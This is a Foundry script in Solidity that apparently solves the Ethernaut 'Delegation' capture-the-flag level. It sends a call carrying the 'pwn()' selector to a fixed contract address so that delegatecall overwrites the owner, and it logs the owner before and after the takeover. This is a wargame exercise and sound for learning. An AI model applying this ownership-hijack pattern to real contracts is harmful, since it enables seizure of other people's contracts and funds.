// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "../src/Delegation.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";



contract DelegationSolution is Script {

    Delegation public delegation = Delegation(0x0260117Be25Ca90c7d564291aC928c030e655623);
    function run () external {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        console.log("current owner: ", delegation.owner()); 
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("owner after attack: ", delegation.owner());
        vm.stopBroadcast(); 

    }
}

